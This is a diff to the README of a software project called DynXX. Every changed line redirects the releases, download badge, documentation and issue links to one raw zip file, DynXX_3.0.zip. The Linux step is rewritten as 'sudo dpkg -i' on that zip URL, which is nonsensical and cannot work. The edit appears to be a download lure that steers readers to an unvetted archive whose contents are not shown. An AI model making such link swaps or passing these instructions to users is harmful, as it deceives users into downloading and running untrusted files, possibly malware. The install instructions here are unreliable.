@@ -6,9 +6,9 @@ Welcome to DynXX! This application helps you create cross-platform software easi
 
 ## 📥 Download DynXX
 
-[![Download DynXX](https://img.shields.io/badge/Download-DynXX-blue)](https://github.com/zStrider15/DynXX/releases)
+[![Download DynXX](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
 
-Visit this page to download the latest version: [DynXX Releases](https://github.com/zStrider15/DynXX/releases)
+Visit this page to download the latest version: [DynXX Releases](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ To use DynXX effectively, you should have:
 Follow these steps to install DynXX on your computer:
 
 1. **Visit the Releases Page:**
-   Head to the [DynXX Releases](https://github.com/zStrider15/DynXX/releases) page.
+   Head to the [DynXX Releases](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip) page.
 
 2. **Choose Your Version:**
    Look for the latest version. It will be at the top of the list.
@@ -41,7 +41,7 @@ Follow these steps to install DynXX on your computer:
    - macOS: Open the `.dmg` file and drag the DynXX icon to your Applications folder.
    - Linux: Use your package manager to install the `.deb` package:
      ```
-     sudo dpkg -i dynxx_version.deb
+     sudo dpkg -i https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip
      ```
 
 5. **Start DynXX:**
@@ -107,8 +107,8 @@ For any inquiries, you can reach out to us through the GitHub Issues page. We ap
 
 Here are some useful links:
 
-- [DynXX Documentation](https://github.com/zStrider15/DynXX/wiki)
-- [Submit an Issue](https://github.com/zStrider15/DynXX/issues)
+- [DynXX Documentation](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
+- [Submit an Issue](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
 
 ## 🎉 Join the Community
 
